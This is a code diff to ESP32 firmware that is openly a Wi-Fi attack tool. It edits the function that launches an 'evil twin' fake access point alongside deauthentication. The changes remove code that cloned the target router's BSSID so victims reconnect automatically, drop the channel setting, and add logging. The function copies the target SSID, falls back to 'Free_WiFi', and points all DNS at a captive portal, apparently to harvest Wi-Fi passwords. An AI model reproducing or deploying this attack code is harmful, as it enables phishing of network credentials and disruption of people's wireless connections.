@@ -1746,30 +1746,9 @@ void stopAllAttacks() {
 void stopEvilTwin();
 
 void startEvilTwinWithDeauth() {
+  WiFi.disconnect(true);
   WiFi.mode(WIFI_AP_STA);
   delay(200);
-
-  // [PATCH 5] Clone BSSID target ke softAP — agar client auto-reconnect
-  bool bssidValid = false;
-  for (int i = 0; i < 6; i++) {
-    if (g_targetBSSID[i] != 0) { bssidValid = true; break; }
-  }
-  if (bssidValid) {
-    uint8_t curMac[6]; esp_wifi_get_mac(WIFI_IF_AP, curMac);
-    if (memcmp(curMac, g_targetBSSID, 6) != 0) {
-      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
-      if (macErr != ESP_OK) {
-        Serial.printf("[WARN] Evil Twin set_mac failed (%d)\n", macErr);
-      } else {
-        Serial.printf("[EVIL TWIN] BSSID cloned: %02X:%02X:%02X:%02X:%02X:%02X\n",
-                      g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
-                      g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5]);
-      }
-      delay(50);
-    }
-  } else {
-    Serial.println("[EVIL TWIN] BSSID target invalid — skip MAC clone");
-  }
 
   String safeSSID = targetSSID;
   if (safeSSID.length() == 0) safeSSID = "Free_WiFi";
@@ -1782,9 +1761,14 @@ void startEvilTwinWithDeauth() {
     drawMainMenu();
     return;
   }
-
-  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
   delay(500);
+
+  uint8_t fakeMac[6];
+  esp_wifi_get_mac(WIFI_IF_AP, fakeMac);
+  Serial.printf("[EVIL TWIN] Fake AP: SSID=%s MAC=%02X:%02X:%02X:%02X:%02X:%02X ch=%d\n",
+                safeSSID.c_str(),
+                fakeMac[0], fakeMac[1], fakeMac[2], fakeMac[3], fakeMac[4], fakeMac[5],
+                g_targetChannel);
 
   IPAddress IP = WiFi.softAPIP();
   dnsServer.start(DNS_PORT, "*", IP);
@@ -1803,14 +1787,12 @@ void startEvilTwinWithDeauth() {
   g_attackMode = ATK_EVIL_TWIN;
   evilTwinStartTime = millis();
 
-  Serial.printf("Evil Twin Started. SSID: %s BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%d (attempt %d/%d)\n",
-                safeSSID.c_str(),
+  Serial.printf("Evil Twin Started. Target BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%d (attempt %d/%d)\n",
                 g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                 g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                 g_targetChannel,
                 verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
 }
-
 void stopEvilTwin() {
   isEvilTwinRunning = false;
   isReleasing = false;
